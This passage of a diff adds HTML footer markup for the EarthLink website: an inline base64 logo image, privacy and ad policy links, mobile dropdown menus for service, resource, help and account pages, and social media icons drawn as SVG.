+            src="data:image/png;base64,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"
+            alt="footer logo"
+          />
+          <div style="padding-right: 60px">
+            <a
+              class="list-anchor"
+              href="https://www.earthlink.net/tcs/privacy-policy"
+              >Privacy Policy &nbsp;</a
+            ><span style="color: rgb(255, 255, 255)"> • &nbsp;</span
+            ><a
+              class="list-anchor"
+              href="https://www.earthlink.net/tcs/interest-based-ads"
+              >Interest-Based Ads</a
+            >
+          </div>
+        </div>
+        <footer
+          class="mobile-footer bg-elnk-grey dark:bg-dt-secondary block laptop:hidden text-base"
+        >
+          <div class="nav-wrapper w-full p-6">
+            <nav class="mb-4 first">
+              <div>
+                <button
+                  class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle"
+                  type="button"
+                >
+                  <span>Internet</span
+                  ><span class="stroke-[2px] origin-center icon-wrapper"
+                    ><svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="24"
+                      height="24"
+                      fill="none"
+                      viewBox="6 0 26 26"
+                    >
+                      <path
+                        stroke="currentColor"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.786 18.572 21.357 13 15.786 7.43"
+                      ></path></svg
+                  ></span>
+                </button>
+                <div class="hidden footer-dropdown-content">
+                  <ul>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/fiber-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Fiber Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/wireless-home-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Wireless Home Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/business-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Business Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet-near-me/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Internet Near Me</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/satellite-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Satellite Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/internet/rural-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Rural Internet</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div>
+                <button
+                  class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle"
+                  type="button"
+                >
+                  <span>Resources</span
+                  ><span class="stroke-[2px] origin-center"
+                    ><svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="24"
+                      height="24"
+                      fill="none"
+                      viewBox="6 0 26 26"
+                    >
+                      <path
+                        stroke="currentColor"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.786 18.572 21.357 13 15.786 7.43"
+                      ></path></svg
+                  ></span>
+                </button>
+                <div class="hidden footer-dropdown-content">
+                  <ul>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/resources/internet-speed-test/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Internet Speed Test</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/resources/bandwidth-calculator/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Bandwidth Calculator</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/resources/fiber-vs-cable-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Fiber vs. Cable</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/resources/ultimate-guide-to-the-internet/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Ultimate Guide to the Internet</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/blog/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Blog</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/resources/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >All Resources</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div>
+                <button
+                  class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle"
+                  type="button"
+                >
+                  <span>EarthLink</span
+                  ><span class="stroke-[2px] origin-center"
+                    ><svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="24"
+                      height="24"
+                      fill="none"
+                      viewBox="6 0 26 26"
+                    >
+                      <path
+                        stroke="currentColor"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.786 18.572 21.357 13 15.786 7.43"
+                      ></path></svg
+                  ></span>
+                </button>
+                <div class="hidden footer-dropdown-content">
+                  <ul>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/about-us/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >About Us</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/about-us/contact/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Contact</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/media/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Media</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/about-us/partners/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Partners</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/about-us/careers/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Careers</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://www.earthlink.net/tcs/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Terms &amp;amp; Conditions</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div>
+                <button
+                  class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle"
+                  type="button"
+                >
+                  <span>Help</span
+                  ><span class="stroke-[2px] origin-center"
+                    ><svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="24"
+                      height="24"
+                      fill="none"
+                      viewBox="6 0 26 26"
+                    >
+                      <path
+                        stroke="currentColor"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.786 18.572 21.357 13 15.786 7.43"
+                      ></path></svg
+                  ></span>
+                </button>
+                <div class="hidden footer-dropdown-content">
+                  <ul>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://help.earthlink.net/portal/en/home"
+                        target="_blank"
+                        rel="noreferrer"
+                        >Support</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div>
+                <button
+                  class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle"
+                  type="button"
+                >
+                  <span>Account</span
+                  ><span class="stroke-[2px] origin-center"
+                    ><svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="24"
+                      height="24"
+                      fill="none"
+                      viewBox="6 0 26 26"
+                    >
+                      <path
+                        stroke="currentColor"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.786 18.572 21.357 13 15.786 7.43"
+                      ></path></svg
+                  ></span>
+                </button>
+                <div class="hidden footer-dropdown-content">
+                  <ul>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://portal.earthlink.net/account/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >My Account</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://webmail1.earthlink.net/login"
+                        target="_blank"
+                        rel="noreferrer"
+                        >WebMail</a
+                      >
+                    </li>
+                    <li class="last:mb-2">
+                      <a
+                        class="hover:opacity-80 text-white underline dark:text-white"
+                        href="https://my.earthlink.net/"
+                        target="_blank"
+                        rel="noreferrer"
+                        >My EarthLink</a
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </nav>
+            <nav class="second">
+              <h4 class="mb-2 font-bold text-white">Follow EarthLink</h4>
+              <ul class="flex">
+                <li
+                  class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"
+                >
+                  <a
+                    class="p-2"
+                    href="https://twitter.com/earthlink"
+                    target="_blank"
+                    rel="noreferrer"
+                    aria-label="Twitter"
+                    ><span class="stroke-[1.5px]"
+                      ><svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        fill="none"
+                        viewBox="0 0 24 22"
+                      >
+                        <path
+                          fill="currentColor"
+                          d="M18.88 0h3.68l-8.08 9.336L23.92 22h-7.408l-5.8-7.696L4.072 22H.392l8.56-9.985L-.088 0h7.592l5.24 7.03L18.88 0Zm-1.288 19.808h2.04L6.432 2.111H4.24l13.352 17.697Z"
+                        ></path></svg></span
+                  ></a>
+                </li>
+                <li
+                  class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"
+                >
+                  <a
+                    class="p-2"
+                    href="https://www.facebook.com/earthlink"
+                    target="_blank"
+                    rel="noreferrer"
+                    aria-label="Facebook"
+                    ><span class="stroke-[1.5px]"
+                      ><svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        fill="#fff"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          fill="currentColor"
+                          d="M17.525 9H14V7c0-1.032.084-1.682 1.563-1.682h1.868v-3.18A26.065 26.065 0 0 0 14.693 2C11.98 2 10 3.657 10 6.699V9H7v4l3-.001V22h4v-9.003l3.066-.001L17.525 9z"
+                        ></path></svg></span
+                  ></a>
+                </li>
+                <li
+                  class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"
+                >
+                  <a
+                    class="p-2"
+                    href="https://www.linkedin.com/company/earthlink"
+                    target="_blank"
+                    rel="noreferrer"
+                    aria-label="LinkedIn"
+                    ><span class="stroke-[1.5px]"
+                      ><svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        fill="#fff"
+                        viewBox="0 0 30 30"
+                      >
+                        <path
+                          fill="currentColor"
+                          d="M9 25H4V10h5v15zM6.501 8a2.5 2.5 0 1 1 0-5.001A2.5 2.5 0 0 1 6.5 8zM27 25h-4.807v-7.3c0-1.741-.033-3.98-2.499-3.98-2.503 0-2.888 1.896-2.888 3.854V25H12V9.989h4.614v2.051h.065c.642-1.18 2.211-2.424 4.551-2.424 4.87 0 5.77 3.109 5.77 7.151V25z"
+                        ></path></svg></span
+                  ></a>
+                </li>
+                <li
+                  class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"
+                >
+                  <a
+                    class="p-2"
+                    href="https://www.youtube.com/c/EarthLinkOrbit"
+                    target="_blank"
+                    rel="noreferrer"
+                    aria-label="Youtube"
+                    ><span class="stroke-[1.5px]"
+                      ><svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        fill="#fff"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          fill="currentColor"
+                          d="M21.582 6.186a2.506 2.506 0 0 0-1.768-1.768C18.254 4 12 4 12 4s-6.254 0-7.814.418c-.86.23-1.538.908-1.768 1.768C2 7.746 2 12 2 12s0 4.254.418 5.814c.23.86.908 1.538 1.768 1.768C5.746 20 12 20 12 20s6.254 0 7.814-.418a2.504 2.504 0 0 0 1.768-1.768C22 16.254 22 12 22 12s0-4.254-.418-5.814zM10 14.598V9.402a.5.5 0 0 1 .75-.433l4.5 2.598a.5.5 0 0 1 0 .866l-4.5 2.598a.5.5 0 0 1-.75-.433z"
+                        ></path></svg></span
+                  ></a>
+                </li>
+              </ul>
+            </nav>
+          </div>
+          <section
+            class="flex flex-col items-center justify-center bg-elnk-dark-grey pt-5 text-sm text-white dark:bg-dt-background"
+          >
+            <p>© Copyright 2026 EarthLink LLC</p>
+            <p>All rights reserved</p>
+            <div class="link-wrapper">
+              <a
+                class="hover:opacity-80 text-white underline dark:text-white"
+                href="https://www.earthlink.net/tcs/privacy-policy/"
+                target="_blank"
+                rel="noreferrer"
+                >Privacy Policy</a
+              ><i class="px-1">·</i
+              ><a
+                class="hover:opacity-80 text-white underline dark:text-white"
+                href="https://www.earthlink.net/tcs/interest-based-ads/"
+                target="_blank"
+                rel="noreferrer"
+                >Interest-Based Ads</a
+              >
+            </div>
+            <div
+              class="logo-wrapper pointer-events-none relative -mt-[30px] flex w-full justify-center overflow-hidden"
+            >
+              <span class="stroke-[1.5px] translate-y-1/2"
+                ><svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="80"
+                  height="80"
+                  fill="none"
+                  viewBox="0 0 34 31"
+                >
+                  <path
+                    fill="#F58B21"
+                    fill-rule="evenodd"
+                    d="M5.54 17.926a11.616 11.616 0 0 1-.307-2.646c0-6.444 5.251-11.667 11.728-11.667 1.578 0 3.083.311 4.457.874a56.153 56.153 0 0 1 3.613-2.207A15.338 15.338 0 0 0 16.961 0C8.478 0 1.601 6.841 1.601 15.28c0 2.062.414 4.027 1.157 5.821a59.925 59.925 0 0 1 2.782-3.175ZM30.901 8.898l-.044-.099a16.562 16.562 0 0 0-.47-.91c-.018-.03-.037-.058-.054-.088a.077.077 0 0 0 .01-.014 15.354 15.354 0 0 0-3.174-3.912 39.973 39.973 0 0 0-2.14 1.202c-.39.233-.794.483-1.207.746 2.947 2.12 4.868 5.563 4.868 9.457 0 6.444-5.251 11.668-11.729 11.668-4.581 0-8.54-2.62-10.47-6.428a67.086 67.086 0 0 0-2.486 2.957 15.41 15.41 0 0 0 3.662 3.968l.006-.003.074.058c.27.203.548.397.832.58l.1.064a15.336 15.336 0 0 0 8.283 2.416c8.483 0 15.359-6.841 15.359-15.28 0-2.284-.507-4.449-1.41-6.394l-.01.012Z"
+                    clip-rule="evenodd"
+                  ></path>
+                  <path
+                    fill="#FFF"
+                    fill-rule="evenodd"
+                    d="M33.509 1.738c-.352-.407-.894-.614-1.613-.614-2.313 0-6.984 2.39-12.351 6.264.263.262.483.566.655.898 1.65-1.191 3.338-2.318 4.829-3.21a40.51 40.51 0 0 1 2.09-1.177c2.09-1.09 3.741-1.668 4.777-1.668.378 0 .636.078.769.23.324.374.195 1.923-2.332 5.34.017.03.037.058.053.088.167.298.324.602.47.911.016.032.03.066.045.099l.031-.041c2.716-3.563 3.582-5.958 2.577-7.12ZM16.962 7.72a2.23 2.23 0 0 0-2.236 2.224c0 .363.097.702.253 1.006-.545.452-1.195.995-1.353 1.13-4.32 3.698-8.083 7.547-10.597 10.836C.259 26.544-.6 28.871.407 30.032c.36.419.879.623 1.582.623 1.468 0 3.831-.885 6.655-2.492l.035-.02c-.033-.02-.067-.04-.1-.062a15.19 15.19 0 0 1-.831-.58l-.075-.06c-2.47 1.374-4.489 2.131-5.684 2.131-.339 0-.588-.089-.74-.263-.374-.434.019-2.37 2.666-5.72 3.725-4.717 7.316-7.996 10.335-10.58.163-.14.881-.74 1.462-1.222.357.24.787.38 1.25.38a2.229 2.229 0 0 0 2.235-2.223c0-1.228-1-2.224-2.235-2.224Z"
+                    clip-rule="evenodd"
+                  ></path></svg
+              ></span>
+            </div>
